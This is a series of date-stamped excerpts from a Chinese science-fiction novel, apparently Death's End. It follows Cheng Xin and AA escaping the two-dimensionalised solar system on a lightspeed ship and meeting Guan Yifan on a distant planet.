<p>联邦政府与星环集团的合作项目是秘密进行的，知道存在曲率引擎的人不多，知道太阳系仅存的那一套安装在什么地方的人更少，但还是很危险，末日到了，人心难测啊，‘星环’号将成为全世界争夺的对象，人们将为它自相残杀，最后可能什么都不会剩下。所以，在打击警报发布前，必须让‘星环’号尽快离开掩体世界，当时真的没时间了。曹彬让‘星环’号到冥王星来，是想让你们接我上飞船，其实他应该让‘星环’号从木星直接加速到光速。”</p>
<p>“是啊，您为什么不跟我们一起走呢？！”AA大声问。“我活得够长了，就是上了飞船，也再活不了多久，在这里做一个守墓人很合适。”</p>
<p>“我们去接您！”程心说。“不要胡来，时间不多了。</p>
<p>2016-01-31</p>
<p>三维空间正在加速向二维平面坠落，在飞船的视野中，二维太阳已经占据了一半的太空，它现在已经完全熄灭，是一片浩渺的暗红色死海。这时，程心和AA发现，二维平面并不是绝对平整的，它在波动！有一道道两端都望不到尽头的长波滚过二维平面，正是三维空间中类似的波动和翘曲，使“蓝色空间”号和“万有引力”号拥有进入四维空间的通道。即使在没有二维物质的地方，二维平面的波动也能看得出来——这是二维空间在三维中的一种自显形，只有在平面足够大的情况下才能产生。在“星环”号上，已经明显地感觉到加速坠落产生的空间畸变。程心看到，圆形的舷窗变成了椭圆，本来很苗条的AA变得有些矮胖，空间在坠落的方向上拉伸，但程心和AA并没有感到任何不适，飞船各系统的运行也正常。</p>
<p>“请返回冥王星！”程心对A.I.说，然后她转向窗口中的罗辑，“我们一定要回去，时间还是有的，天王星还在二维化！”“目前可通信的指令者中，罗辑拥有最高指令权限，只有他才能指令‘星环’号返回冥王星。”飞船A.I.刻板地回答。</p>
<p>隧洞前的罗辑笑了笑，“我要是想走，刚才就跟你们走了，我这样岁数的人，不适合远航了。孩子们，不要为我操心了，我说过的，我什么都没有失去。准备启动空间曲率驱动。”罗辑的最后一句话是对飞船A.I.说的。</p>
<p>“航线参数？”A.I.问。“目前航线的延长线吧，我也不知道你们要去哪儿，我想现在你们自己也不知道，要是想起了目的地，在星图上指出来就行了，半径五万光年内的大部分恒星，飞船都可以自动导航到达。”</p>
<p>2016-01-31</p>
<p>指令执行中，空间曲率驱动引擎三十秒后启动。”A.I.说。</p>
<p>“我们要进入深海液吗？”AA问，但她心里清楚，如果是常规推进，这样级别的加速度，进入什么液都要被压成薄饼的。“不需要任何准备，这是空间驱动，没有过载。”</p>
<p>“曲率驱动引擎启动，系统运行正常。空间扭矩：23.8。推进曲率比：3.41:1；‘星环’号将在六十四分十八秒后进入光速。”在程心和AA的感觉中，A.I.宣布的启动更像是停机，因为周围突然安静下来，而且这安静一直持续下去。她们知道，安静是由于聚变发动机停机所至，聚变堆和推进器产生的嗡嗡声消失了，但再也没有其他的声音来填补，真的很难相信有什么东西启动了。</p>
<p>不过，曲率驱动的迹象还是出现了。空间畸变渐渐消失，舷窗重新变圆，AA也恢复了苗条。透过舷窗看外面，附近的逃亡飞船仍在超越“星环”号，但超越的速度明显变慢了。</p>
<p>2016-01-31</p>
<p>程心转向那个信息窗口，里面显示着飞船监视系统拍摄的冥王星的画面，这时冥王星已经远去，但还能够清晰地看到，正如AA所说，冥王星与它的卫星卡戎都变成了两个，相距不远地并列着。程心还发现，被复制的不仅仅是冥王星，二维平面背景上的景观也有部分重现，就像在图像处理软件中框选并复制了一个区域后稍稍移开一样。“那是因为在‘星环’号的航迹中，光速变慢了。”罗辑解释说，他的图像已经开始扭曲，但声音仍很清晰，“你们看到的其中一个冥王星，是慢光速传过来的图像。在这个过程中，冥王星还在运行中，它移出了航迹的范围，又通过正常光速传来一个图像，你们就看到两个了。”</p>
<p>“光速变慢？”程心敏感地觉察到了一个巨大的秘密。罗辑继续说：“听说你们是从肥皂小船悟出曲率驱动的，那我现在问一句：小船在浴盆中航行到达对岸后，你们有没有把它拿回来，放到浴盆里再试一次？”</p>
<p>当时没有，由于担心智子，程心把小船扔到一边去了，但很容易想出结果。“小船不会再动了，因为第一次航行后，水的张力已经被减小了。”程心说。</p>
<p>“很对，光速飞船也一样。在曲率驱动的航迹上，空间的结构也被改变了，如果把同样的第二艘曲率驱动飞船放在第一艘飞船的航迹范围里，它将寸步难行。在航迹空间中，必须使用功率更大的曲率引擎，这时，空间曲率驱动仍能够使飞船达到航迹空间的最高速度，但这个速度比第一次航行时达到的最高速度要低得多。换句话说，在航迹空间里，真空光速降低了。”</p>
<p>2016-01-31</p>
<p>能降低到多少？”</p>
<p>“从理论上说能降到零，但在实际中几乎不可能做到。不过，把‘星环’号的曲率引擎的空间扭矩调到足够大，可以使航迹空间的光速降到人们梦寐以求的每秒16.7千米。”“这就是……”AA盯着罗辑的影像说。</p>
<p>这就是黑域了，程心这样想，但没有说出来。“这就是黑域。”罗辑说，“当然，要产生容纳一个恒星系的黑域，一艘飞船是远远不够的。据计算，生成容纳太阳系的黑域需要一千多艘曲率驱动飞船，这些飞船以太阳为中心，放射状地朝各个不同的方向加速到光速，它们产生的航迹在扩散中连成一体，形成一个笼罩整个太阳系的球体，这个球体中的光速为每秒16.7千米，这就是低光速黑洞，就是黑域。”</p>
<p>“黑域是光速飞船产生的！”AA说。在宇宙中，曲率驱动航迹既可以成为危险标志，也能成为安全声明。如果航迹在一个世界旁边，是前者；如果把这个世界包裹在其中，则是后者。就像一个手拿绞索的人，他是危险的；但如果他把绞索套到自己的脖子上，他就变成安全的了。</p>
<p>2016-01-31</p>
<p>是的，但这点知道得很晚。在曲率驱动的研究中，实验是领先于理论的，你知道，这也是维德的风格。很多实验中的发现在理论上无法解释，没有理论指导，也就很难有意识地去注意一些现象。在研究初期，就是驱动你头发的那个阶段，曲率驱动产生的尾迹很少很淡薄，没有被注意到。其实当时有很多迹象，比如那些尾迹扩散后，低光速曾使附近一些计算机的量子集成电路出现故障，但还是没人往这方面想。后来随着实验规模增大，人们才发现了曲率驱动尾迹的秘密。也正是因为这个原因，联邦政府才同意与我们合作。这时，可以说他们对这个事业是倾尽全力的，政府投入了巨大的力量研制光速飞船，但时间已经来不及了……”罗辑摇头叹息一声，没有再说下去。</p>
<p>2016-01-31</p>
<p>“从星环城事件到水星基地建立完成，这中间有三十五年，宝贵的三十五年耽误了。”程心替他把话说了出来。</p>
<p>罗辑默默地点点头，他看程心的目光已经没有了慈爱，像最后审判日的火炬，至少在她看来是这样，那目光分明在说：孩子，看看你干了什么？</p>
<p>2016-01-31</p>
<p>现在程心知道，地球文明的三条生存之路：掩体、黑域和光速飞船，其中只有光速飞船是真正的活路。</p>
<p>云天明指出了这条活路，但她把这条路堵死了。</p>
<p>2016-01-31</p>
<p>如果她没有制止维德，星环城有可能获得独立，即使是暂时的、有限的独立，也有可能促使他们发现曲率驱动的尾迹效应，这将使联邦政府改变对光速飞船的态度，进而使人类有足够的时间建造那一千多艘光速飞船，进而有可能建造黑域，避免这次维度打击。</p>
<p>那时，人类会分成两部分，想飞向星空的和想在黑域中过安乐生活的，前者乘光速飞船离去，为后者留下黑域，各得其所。她终于还是犯了第二次错误。</p>
<p>她两次处于仅次于上帝的位置上，却两次以爱的名义把世界推向深渊，而这一次已没人能为她挽回。</p>
<p>2016-01-31</p>
<p>她开始恨一个人，这人就是维德，她恨他竟然遵守了诺言。为什么遵守？男人的尊严，还是为了她？当然，程心也明白，维德当时并不知道曲率驱动的尾迹效应，他研制光速飞船的目的，就像那个不知名的星环城战士所说，是在为自由而战，为成为宇宙中的自由人而战，为了太阳系外那千万个美妙的世界而战。如果他知道光速飞船是人类唯一活路的话，她相信他是不会受到诺言限制的。</p>
<p>但是不要推卸责任，不管她是不是真的仅次于上帝，只要在那个位置上，就不可能推卸责任。</p>
<p>2016-01-31</p>
<p>不久前在冥王星上时，程心刚刚经历了一生中最轻松的时刻。其实面对世界末日的人是最轻松的，所有的责任和负担都已卸下，所有的担忧和焦虑都已消散，人生回到了从母腹出生时最单纯的状态。程心那时只需平静地等待，等待着在这如诗如画的毁灭中，成为太阳系巨画的一部分。</p>
<p>但现在，一切都反过来了。早期宇宙学曾有过一个悖论，认为如果宇宙无限，具有无限数量的天体的引力相叠加，将使宇宙中的每一点都受到无穷大的引力。程心这时感觉自己真的受到了无穷大的引力，这引力来自宇宙的各个方向，无情地撕扯着她的灵魂。一百二十七年前，她作为执剑人的最后时刻那可怕的幻觉又出现了，四十亿年的时光沉积在她上方，让她窒息。太空中充满了眼睛，都在盯着她，恐龙的眼睛，三叶虫和蚂蚁的眼睛，鸟和蝴蝶的眼睛，细菌的眼睛……仅地球上生活过的人类的眼睛就有一千亿双。程心看到了AA的眼睛，读出了她目光中的话：你终于还是遇到了比死更可怕的事。</p>
<p>程心知道自己必须活下去，她和AA将是地球文明仅存的两个人，如果她去死，就等于杀了地球人类的一半，她只能活下去，这真是与她的失误极其相称的惩罚。</p>
<p>2016-01-31</p>
<p>可是，前方的航程一片空白，她心中的太空不再是黑色的，而是变成了虚无的颜色。去哪里还有什么意义？</p>
<p>“我们去哪儿？”程心喃喃地问道。“去找他们。”罗辑说，这时他的图像更加模糊，而且变成了黑白的。</p>
<p>这话像闪电般照亮了程心黑色的思绪，她和AA对视了一眼，她们当然明白“他们”的含意。罗辑接着说：“他们还在，五年前掩体世界收到了他们发出的引力波信息，很简短的信息，不知道他们在哪儿。‘星环’号在航行时会定期发出呼唤他们的引力波信号，也许你们能找到他们，或者他们找到你们。”</p>
<p>这时，罗辑的黑白影像也消失了，但仍能听到他的声音，他说了最后一句话：“哦，要进画里了，孩子们，走好。”来自冥王星的信号彻底中断了</p>
<p>2016-01-31</p>
<p>程心和AA静静地听着，信号越来越稀疏，声音出现的间隔越来越长，又过了三十分钟，她们终于听到了太阳系传出的最后一个人声：</p>
<p>“啊——”这声呼喊戛然而止，在以后的时间里，万籁俱寂。这幅名为太阳系的二维巨画完成了。</p>
<p>2016-01-31</p>
<p>星环”号仍在向二维平面跌落，它已经达到的高速度只是减缓了跌落的进程，飞船仍未达到二维跌落区的逃逸速度。这时，“星环”号是太阳系唯一还处于二维空间之外的人造物体，程心和AA是仅有的画外人。“星环”号距二维平面已经很近了，从这个角度看去，二维太阳已经变得很扁平，像从海岸看大海一样，它那不再发光的暗红色平面无边无际。刚刚二维化的冥王星这时变得很大，且以肉眼能够觉察的速度继续变大。程心看着二维冥王星那精致的“年轮”，想从中找出博物馆的痕迹，但没找到，它毕竟太小了。三维空间向二维跌落的洪流似乎不可抗拒，程心这时有些怀疑，曲率引擎是否真的能使飞船进入光速，她真的希望一切就此终结，但这时，飞船A.I.说话了：</p>
<p>2016-01-31</p>
<p>星图消失，切换成外部全景显示模式，飞船环境全部隐去，程心和AA如同悬浮在太空中一样，A.I.以前从未使用过这种显示模式。航向的前方，是银河系的星海，这时已经变成了纯蓝色，真的让人想起了海洋；后方，是二维太阳系，二维太阳和行星都笼罩在如血的红色中。</p>
<p>突然，宇宙发生了剧变，前方的所有星星都朝航向所指的方向聚集，仿佛这一半宇宙变成了一个黑色的大碗，群星都在向碗底滑落，很快在正前方聚成密密的一团，已经分辨不出单个的星星，它们凝成一个光团，像一块巨大的蓝宝石发出璀璨的蓝光。不时有零星的星星从光团中飞出，划过漆黑的空间快速向后飞去，它们的色彩不断变化，从蓝变成绿，再变成黄色，当它越过飞船后，则变成了红色。在飞船的后方，二维太阳系和群星一起凝聚成红色的一团，像在宇宙尽头熊熊燃烧的篝火。“星环”号以光速向云天明送给程心的星星飞去。</p>
<p>银河纪元409年，我们的星星</p>
<p>2016-01-31</p>
<p>AA的话就像荷叶上的水滴从程心的思想中滑过，没有留下任何痕迹。程心现在唯一的希望就是见到云天明，向他倾诉这一切。在她的印象中，二百八十七光年是一段极其漫长的航程，但飞船A.I.告诉她，在飞船的参照系内，航行时间只有五十二个小时。程心有一种极其不真实的感觉，有时她觉得自己已经死了，正身处另一个世界。</p>
<p>2016-01-31</p>
<p>当程心醒来时，“星环”号已经接近目的恒星，它的船身旋转了一百八十度，曲率引擎对着前进方向开始减速。这时，飞船其实是在推着航迹前进。减速开始后，前方的蓝色星团和后方的红色星团都在渐渐散开，像两团绽放的焰火一般，很快扩散成满天的星海。随着速度的降低，多普勒效应产生的蓝色和红色也渐渐消退。程心和AA看到，前方的银河系的形状没有发生肉眼能够觉察到的变化，但向后看，只见到一片陌生的星群，太阳系早已无影无踪。</p>
<p>2016-01-31</p>
<p>我们现在距太阳系二百八十六点五光年。”飞船A.I.说。</p>
<p>“也就是说，那里已经过去了二百八十六年？”AA问，一脸如梦初醒的样子。“以那个参照系而言，是这样的。”</p>
<p>程心轻轻叹息，对现在的太阳系而言，二百八十六年抑或二百八十六万年，有什么区别？但她突然想到一件事。</p>
<p>2016-02-01</p>
<p>在那儿，向二维的跌落什么时候停止？”这个问题也让AA呆了好一会儿。是啊，什么时候停止？最初那片小小的二维空间中，是否设定了一个在某个时间停止的指令？对于二维空间以及三维向二维的跌落，程心和AA没有任何理论知识，但直觉告诉她们那不太可能，那个嵌入到二维空间中的停止指令或程序真的太玄乎了，玄乎到不太可能。</p>
<p>跌落永远不会停止吗？！对这件事，最明智的做法是别再去想它了。</p>
<p>2016-02-01</p>
<p>“星环”号关闭曲率引擎后，启动了聚变发动机，飞船上的宁静被打破了，出现了推进器的嗡嗡声和微微的震动。飞船A.I.对监测系统刚刚得到的数据进行分析，重新确定了这个星系的基本状况：DX3906恒星有两颗行星，都是固态行星，其中距恒星较远的一颗体积与火星相当，但没有大气层，表面十分荒凉，由于它呈灰色，程心和AA把它叫做灰星。轨道半径较小的另一颗行星体积与地球相当，表面特征也与地球十分相似，有含氧大气层，且有明显的生命迹象，但没有发现农业和工业文明存在的痕迹；它像地球一样呈现出蓝色，她们叫它蓝星。</p>
<p>2016-02-01</p>
<p>AA很高兴，她的研究成果得到了证实。四百多年前，她的博士学位研究项目就是发现这颗恒星的行星，之前人们认为这是一颗没有行星的裸星。AA也正是由此认识了程心，如果没有这些经历，她的生活将完全是另一个样子。命运真的很奇特，四个世纪前，她从天文望远镜中无数次凝视那个遥远的世界时，做梦也想不到有一天会来到这里。</p>
<p>2016-02-01</p>
<p>星环”号飞越太阳系到DX3906间的二百八十六光年只用了五十二个小时，但以亚光速从这个星系的边缘行驶到那颗类地行星，这仅仅六十个天文单位的路程却用了整整八天时间</p>
<p>2016-02-01</p>
<p>星环”号泊入蓝星的轨道，开始逐渐下降，这时，飞船A.I.突然有了一个重要发现：“接收到一个来自行星表面的智慧电磁信号，是着陆导航信号，威慑纪元初期的格式，接受这个着陆指引吗？”</p>
<p>程心和AA激动地对视了一眼，程心说：“接受！按它的指引着陆。”“将出现4G超重，请进入加速位置，准备好后，指令即将执行。”A.I.说。</p>
<p>“是不是他？”AA兴奋地问。程心轻轻摇摇头，在她过去的生活中，幸运的时光只是大灾难和大毁灭的间隙，她对幸运有些恐惧了。</p>
<p>2016-02-01</p>
<p>“大气成分：氧35%，氮63%，二氧化碳2%，还有微量惰性气体，可以呼吸，但大气压只有0.53个地球标准气压，出舱后不要剧烈活动。”飞船A.I.说。</p>
<p>“站在飞船附近的那个生物是什么？”AA问。“正常人类。”A.I.简单地回答。</p>
<p>程心和AA起身走出飞船，她们对重力还不太适应，步履有些蹒跚。走出舱门，呼吸很顺畅，并没有感到空气的稀薄。迎面吹来一阵风，很冷，但并不凛冽，其中还有一种青草的味道，给她们一种清爽的感觉。视野豁然开朗，蓝白相间的大地和山脉，淡黄色的天空和红色的太阳，这一切仿佛是一张伪造的地球彩色照片，除了色彩变换，其他的都一样。比如地面上的草，除了颜色是蓝的，形状与地球上的草差别不大</p>
<p>2016-02-01</p>
<p>程心感到他的手温暖而有力，他稳健的身体也为她挡住了寒风。面对这个在距太阳系两百多光年外的远方遇到的第一个男人，她有一种扑到他怀中的愿望。</p>
<p>“你们是从太阳系来的吗？”男人问。“是的。”程心点点头，在男人的搀扶下小心翼翼地往舷梯下走，她对他的信任感在增强，便把更多的身体重量压在他身上。</p>
<p>“太阳系已经没有了。”AA说，她在舷梯顶部坐下。“知道，还有人跑出来吗？”这时程心已经下到地面，站在柔软的草丛中，她在舷梯最下面一级疲惫地坐下，同时摇摇头，“可能没有了。”</p>
<p>“哦……”男人点点头，走上舷梯去扶AA，“我叫关一帆，在这里还真等到你们了。”“你知道我们要来？”AA把手伸给关一帆时说。</p>
<p>“我收到了你们的引力波信息。”“你是‘蓝色空间’号上的人吗？”</p>
<p>“呵呵，如果对刚走的那些人提这个问题，他们肯定很奇怪，‘蓝色空间’号和‘万有引力’号上的人现在已经是四个世纪前的古人了。不过，我还真是个古人，我是‘万有引力’号上的随舰研究员，这四个世纪一直在冬眠，五年前才苏醒。”“‘蓝色空间’号和‘万有引力’号现在在哪儿？”程心扶着舷梯栏杆吃力地站起来，看着正在扶AA下来的关一帆问。</p>
<p>“在博物馆。”“博物馆在哪儿？”AA问，她扶着关一帆的肩膀，几乎是被他抱着下来。</p>
<p>“在一号和四号世界里。”“一共有几个世界？”</p>
<p>“四个，还有两个正在拓荒中。”“这些世界都在哪儿？”这时，关一帆已经把AA扶到地面，他放开她，笑着说：“二位，以后不管遇到谁，人类或别的任何有智慧的东西，不要问他们的世界在哪儿，这是这个宇宙的基本礼节，就像不要问女士的年龄……不过我还是想问，你们都多大了？”</p>
<p>“你看着像多大就多大吧，她七百岁，我五百岁，事实就是这样。”AA说，在草地上坐下来。“程心博士与四个世纪前相比几乎没变。”</p>
<p>“你认识她？”AA抬头看着关一帆问。“从地球收到的图像中见过，那也是四个世纪前的事了。”</p>
<p>“这里有多少人，这颗行星上？”程心问。“三个，就我们三个。”</p>
<p>“这么说，你们那几个世界都比这里好？”AA吃惊地问道。“你是说自然环境吗？当然不是，在那些地方，经过一个世纪的改造后，大气层才勉强能呼吸。这是个好地方，我们见过的最好的地方，只是程心博士，我们欢迎你到这里来，但不能承认你对这里的所有权。”</p>
<p>“我早就放弃所有权了。”程心说，“那为什么不向这里移民呢？”“这里很危险，外人常来。”</p>
<p>“外人？外星人？”AA问。“是的，这一带靠近猎户旋臂的中心，有两条繁忙的航线。”“那你在这里做什么，就为等我们吗？”</p>
<p>“不，我是和一支考察队过来的，他们已经离开了，我留下来等你们。”十几个小时后，三人迎来了蓝星的夜晚。夜空中没有月亮，但与地球相比，这里的星空要明亮许多，银河系像银色的火海一般，能够在地上映出人影。其实与太阳系相比，这里距银河系的中心并没有近多少，可能是这二百八十七光年的空间中有星际尘埃，使太阳系看到的银河黯淡了许多。</p>
<p>2016-02-01</p>
<p>在明亮的星光中，可以看到草地的许多部分在移动，程心和AA最初以为是风造成的幻觉，结果发现自己脚下的草丛也在移动，并发出细微的沙沙声。关一帆告诉她们，蓝草确实会动，它们的根须也是脚，每年的不同季节，草丛都会在不同的纬度间迁徙，主要是在夜间行走。AA听到这话，立刻把手中把玩的两片草叶扔了。关一帆说这些草确实是植物，靠光合作用生存，只有简单的触觉。这个世界的其他植物也能行走，他指给她们看远方的山脊，可以看到在星光下移动的树林，那些树木行走的速度比草要快许多，远远看去像夜行的军队一样。</p>
<p>2016-02-01</p>
<p>关一帆指着夜空中一个星星比较稀疏的方向说：“看那里，就在前几天，那里还能看到太阳，比从地球上看我们这里的这颗恒星要清楚，当然，那是二百八十七年前的太阳了。太阳是在考察队离开的那天熄灭的。”</p>
<p>“太阳只是不发光了，但面积很大，从这里用望远镜也许能看到。”AA说。“不，什么都看不到了。”关一帆摇摇头，又指了指那片空旷的夜空，“即使你们现在回到那里去，也看不到什么了，那里已经是空荡荡的太空，一无所有。你们看到的二维太阳和行星，其实是二维化后三维物质的一种能量释放效应。你们看到的其实不只是二维物质，是它们释放的电磁波在二维和三维空间交界面的折射，能量释放完成后，一切都不可见了，二维太阳系与三维世界永远地失去了联系。”</p>
<p>“怎么会呢？在四维空间是可以看到三维世界的。”程心说。“是的，我就从四维看过三维，但三维看不到二维，因为三维是有厚度的，有一个维度可以阻挡和散射来自四维的光线，所以能够从四维看到；但二维没有厚度，三维世界的光线能够完全穿过，所以二维世界是全透明的，不可能看到。”</p>
<p>“无论用什么办法都看不到吗？”AA问。“看不到，从理论上讲也不可能看到。”</p>
<p>程心和AA沉默许久。太阳系完全消失了，她们对母亲世界仅有的一点寄托原来也不存在。但关一帆随即给了她们一个小小的安慰：“从三维世界可以凭一样东西检测到二维太阳系的存在，仅此一样：引力。二维太阳系的万有引力仍作用于三维世界，所以，那片空荡荡的太空中应该存在着一个完全看不见的引力源。”</p>
<p>程心和AA若有所思地对视着。“有些熟悉，是不是？”</p>
<p>2016-02-01</p>
<p>三体舰队呢？”程心问。</p>
<p>“也知道得不多。三体第一舰队和第二舰队可能从来就没有会合。六十多年前，金牛座附近爆发了一场大规模战役，很惨烈，残骸形成了一片新的尘埃云。我们可以肯定其中的一方就是三体第二舰队，不知道另一方是谁，战役的结果也不清楚。”“第一舰队呢？”程心关切地问，她的双眸在星光中闪亮。</p>
<p>“不知道，没有任何消息……你们不能在这里待太长时间，这不是个安全的地方。跟我走，去我们的世界吧，那里拓荒时代已经结束，生活开始好起来了。”“我同意！”AA说，然后挽住程心的胳膊，“我们跟他走吧，你就是在这里等一辈子，最大的可能也是什么都等不到，生活总不能全是等待吧？”</p>
<p>程心默默地点点头，她知道自己追逐的是一个梦。</p>
<p>2016-02-01</p>
<p>他们决定在蓝星再待一天就起航离开。</p>
<p>关一帆有一艘小型飞船停泊在蓝星的同步轨道上。飞船很小，没有名字，只有一个序列编号，但关一帆把它叫“亨特”号，说是为了纪念四百多年前“万有引力”号上的一个朋友。“亨特”号上没有生态循环系统，如果长期航行，乘员只能冬眠。“亨特”号的体积虽然只有“星环”号的几十分之一，却也是一艘曲率驱动的光速飞船。他们决定离开时，关一帆也乘“星环”号，让“亨特”号无人航行即可。程心和AA没有问航线的情况，甚至关于航行时间的问题，关一帆也都避而不答，可见对于人类世界的位置，他是极其谨慎的</p>
<p>2016-02-01</p>
<p>这一天，三个人在“星环”号附近作短途旅行。对于程心、AA和已经消失的太阳系人类来说，这意味着许多个第一次：第一次航行到太阳系外的恒星系，第一次踏上太阳系外的行星，第一次进入一个太阳系之外的有生命的世界。</p>
<p>2016-02-01</p>
<p>关一帆进入“星环”号，对这艘精致的恒星际飞船发出由衷的赞叹，他说，对于他们银河系人类来说，太阳系人类的一样东西是继承不了也学不会的，那就是生活的品位。他在那几个幽美的小庭院中流连许久，沉迷于地球全息影像的宏伟景观中，这时他仍是那种若有所思的样子，眼睛却有些湿润。</p>
<p>2016-02-01</p>
<p>在这段时间里，艾AA总是在一旁含情脉脉地看着关一帆。这一天，他们之间的关系有了微妙的进展。在旅行中，AA总是设法与关一帆接近，当后者说话时，她总是全神贯注地倾听，还不时地微笑点头。以前，她从未在任何男人面前有过这种表现。在与程心结识后的这几个世纪，AA有过无数的情人，而且经常同时有两个以上——这是新时代正常的生活状态，但程心知道，AA从来没有真正爱过一个男性。现在，她显然爱上了这个来自威慑纪元的宇宙学家。对此程心感到很欣慰，到了新世界后，艾AA应该有一个美好的新生活了。</p>
<p>2016-02-01</p>
<p>对于自己，程心知道自己在精神上已经死了，能让她的精神继续活下去的唯一希望是云天明，现在这个希望成了泡影。其实，在二百八十六光年之外、四个世纪之后的一个约会本来就是泡影。在肉体上她当然会活下去，但那仅仅是尽责任，避免残存的地球文明的人口数量减半的责任。</p>
<p>蓝星的夜又降临了，他们决定第二天天亮时起航。</p>
<p>2016-02-01</p>
<p>三十五分钟前，有来历不明的宇宙飞行器在灰星表面降落，这是一支飞行器编队，共有五架。仅仅十二分钟后，这些飞行器就同时从灰星表面起飞，很快消失了，甚至没有观察到它们进入行星轨道。卫星也许受到了强烈干扰，只传回了模糊不清的图像。</p>
<p>关一帆所在的这支考察队的任务，就是寻找并研究外星文明在这个星系留下的踪迹。收到监视卫星的信息后，他立刻决定乘“亨特”号前往灰星探察。程心强烈要求同他一起去，关一帆开始坚决拒绝，但听到AA的一句话后同意了：“让她去吧，她肯定想知道这是不是与云天明有关。”</p>
<p>2016-02-01</p>
<p>临行前，关一帆反复叮嘱AA，除非出现紧急情况，不要与“亨特”号通信联系，因为谁也不知道还有什么外来的东西藏在这个星系中，通信会暴露行踪</p>
<p>2016-02-01</p>
<p>在这仅有三个人的孤寂世界中，即使短暂的分别也是一件让人激动的事，AA与程心和关一帆拥抱道别，祝他们平安</p>
<p>2016-02-01</p>
<p>我没有去过三号世界，没人去过，或者说去过的人不可能从那里回来，那个世界在光墓中。”</p>
<p>“光墓？”“由光速飞船的尾迹产生的低光速黑洞，三号世界就是这样的一个黑洞。发生了一些事件，使他们认为自己世界的坐标已经暴露，所以只能这么做。”“我们叫黑域。”</p>
<p>2016-02-01</p>
<p>程心问关一帆新世界是什么时候制造出光速飞船的，得到的回答是一个世纪前。如此看来，云天明的情报使太阳系人类对银河系人类取得了近两个世纪的优势，即使考虑到新世界的拓荒时间，也至少提前了一个世纪。</p>
<p>2016-02-01</p>
<p>他是个伟大的人。”在程心谈到云天明时，关一帆说。</p>
<p>可是太阳系文明没有抓住这个机会，三十五年，生死攸关的三十五年，被耽误了，可能正是被她耽误了。现在想到这些，她的心已经感觉不到疼痛，只有死后的麻木</p>
<p>2016-02-01</p>
<p>关一帆说：“对人类来说，光速航行是个里程碑，这可以看成第三次启蒙运动，第三次文艺复兴，因为光速航行使人的思想发生了根本的改变，也就改变了文明和文化。”</p>
<p>“是啊，进入光速的那一刻，我也变了。想到自己可以在有生之年跨越时空，在空间上到达宇宙的边缘，在时间上到达宇宙的末日，以前那些只停留在哲学层面上的东西突然变得很现实很具体了。”“是的，比如宇宙的终结、宇宙的目的，这些以前很哲学很空灵的东西，现在每一个俗人都不得不考虑了。”</p>
<p>“在你们那里，有人想过到宇宙末日去吗？”程心问。“当然有，现在，新世界已经发出了五艘终极飞船。”</p>
<p>“终极飞船？”“也有人叫它末日飞船。那些光速飞船没有目的地，只是把曲率引擎开到最大功率疯狂加速，无限接近光速，目的就是用相对论效应跨越时间，直达宇宙末日。据他们计算，十年内就可以跨越五百亿年，那他们现在已经到了，哦，当然是以他们的参照系。其实，并不需要有意识地做这事，比如在飞船加速到光速后，曲率引擎出现无法修复的故障，使飞船不能减速，你也可能在有生之年到达宇宙的末日。”</p>
<p>“太阳系人类很可怜，直到最后，大多数人也只是在那一小块时空中生活过，就像公元世纪那些一辈子都没有走出过山村的老人，宇宙对他们仍然是个谜。”程心说</p>
<p>2016-02-01</p>
<p>关一帆从超重座椅上抬起头看着程心，在3G超重下，这是一个很吃力的动作，但他坚持了好一会儿。</p>
<p>“没什么遗憾，我告诉你，真没什么遗憾。宇宙的真相，还是不知道的好。”“为什么？”</p>
<p>关一帆抬起手指指银河系的星海，然后任手臂以3G的重量砰地砸到身上。“这一切，暗无天日。”</p>
<p>“你是指黑暗森林状态吗？”关一帆摇摇头，在超重下像是在挣扎一样，“黑暗森林状态对于我们是生存的全部，对于宇宙却只是一件小事。如果宇宙是一个大战场——事实上它就是——在阵地间，狙击手们射杀对方不慎暴露的人，比如通信兵，或伙头军什么的，这就是黑暗森林状态；对于战争来说它是一件小事，而真正的星际战争，你们还没见过。”</p>
<p>“你们见过吗？”“见过一点，更多的也只是猜测……你真的想知道吗？这种事情，知道得多一点，你心里的光明就少一点。”</p>
<p>“我心里已经没有光明了，我想知道。”</p>
<p>2016-02-01</p>
<p>于是，在罗辑掉入寒夜中的冰湖六个多世纪后，在地球文明仅存的人类面前，宇宙黑暗的面纱又被揭开一层。</p>
<p>关一帆问道：“你猜一下，对于一个在技术上拥有几乎无限能力的文明，最有威力的武器是什么？不要从技术角度想，从哲学高度想。”程心想了一会儿，挣扎似地摇摇头，“我不知道。”</p>
<p>“你经历过的事情可以给你一些提示。”她经历过什么？她刚刚看到，为了毁灭一个恒星系，残忍的攻击者把那里的空间维度降低了一维。空间维度，空间维度是什么？</p>
<p>“宇宙规律。”程心说。“你很聪明，正是宇宙规律。宇宙规律是最可怕的武器，当然也是最有效的防御手段。无论在银河系还是仙女座星云，无论在本星系群还是超星系群，在真正的星际战争中，那些拥有神一般技术力量的参战文明，都毫不犹豫地把宇宙规律作为战争武器。能够作为武器的规律有很多，最常用的是空间维度和光速，一般是把降低维度用来攻击，降低光速用于防御。所以，太阳系受到的维度打击是顶级攻击方式。怎么说呢，这也算地球文明的荣誉吧，动用维度攻击是看得起你们。在这个宇宙中，让人看得起已经很不容易了。”</p>
<p>“我想起来一件事要问你：太阳系空间向二维的跌落什么时候停止？”“永远不会停止。”</p>
<p>程心打了个寒战，也吃力地抬起头来盯着关一帆。“这就让你害怕了？你以为银河系和整个宇宙中只有太阳系在向二维跌落？呵呵……”</p>
<p>关一帆的冷笑又让程心的心抽动了一下，她说：“要是这样，你说的就不成立了，至少把降低空间维度作为武器这项不成立。从长远看，这是同归于尽的攻击，如果这样下去，发起维度攻击的一方所在的空间迟早也要跌落到二维！”长时间的沉默，直到程心唤了一声：“关博士？”</p>
<p>“你太善良了。”关一帆轻轻地说。“我不明白……”“有一个选择可以使维度攻击者避免同归于尽，你想想看。”</p>
<p>程心沉默许久后说：“我想不出来。”“我知道你想不出来，因为你太善良了。这很简单：攻击者首先改造自己，把自己改造成低维生命，比如由四维生命改造成三维生命，当然也可以由三维改造成二维，当整个文明进入低维后，就向敌人发起维度打击，肆无忌惮，在超大规模上疯狂攻击，不需要任何顾忌。”</p>
<p>程心又陷入长时间的沉默中。“你是不是想起了什么？”关一帆问。</p>
<p>程心确实在回忆。她想起了四百多年前，“蓝色空间”号和“万有引力”号误入四维空间碎块时，探险队与“魔戒”的对话，当时，关一帆就是探险队的一员。这片四维空间是你们建造的吗？</p>
<p>你们说自己从海里来，海是你们建造的吗？这么说，这片四维空间对于你，或者说对于你的建造者，是类似于海洋的东西吗？</p>
<p>是水洼，海干了。为什么这么小的空间里聚集了这么多的飞船，或者说墓地？</p>
